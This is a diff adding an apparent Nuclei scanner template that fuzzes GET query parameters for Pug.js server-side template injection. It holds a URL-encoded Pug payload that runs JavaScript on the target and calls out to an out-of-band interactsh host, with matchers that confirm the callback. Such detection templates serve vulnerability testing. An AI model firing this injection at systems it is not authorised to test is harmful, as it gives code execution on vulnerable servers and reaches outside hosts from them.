@@ -1,0 +1,42 @@
+id: pugjs-oob
+
+info:
+  name: Pug.js - Out of Band Template Injection
+  author: 0xAwali,DhiyaneshDK
+  severity: unknown
+  reference:
+    - https://pugjs.org/
+    - https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756
+  metadata:
+    verified: true
+  tags: ssti,dast,oast,oob
+
+variables:
+  prefix: "{{rand_text_alpha(5)}}"
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      injection:
+        - '%23%7Bfunction%28%29%7B%0A%20%20fetch%28%22http%3A%2F%2F{{interactsh-url}}%22%2C%20%7B%0A%20%20%20%20headers%3A%20%7B%0A%20%20%20%20%20%20%22{{prefix}}%22%3A%20%22application%2Fjson%22%0A%20%20%20%20%7D%0A%20%20%7D%29%0A%7D%28%29%7D'
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        name: request-matcher
+        dsl:
+          - "contains(interactsh_protocol,'http')"
+          - "contains(to_lower(interactsh_request), to_lower(prefix))"
+        condition: and
+# digest: 4a0a004730450221009e3eed55ab1dc1636dfdb0d265d4b1ca3d567097e6ae0044456801fb8f3de77f02201f72efe61b21ef1afb7df08a76973d5d0de2a204dba0b95f1b575e06eb3bac7b:922c64590222798bb761d5b6d8e72950
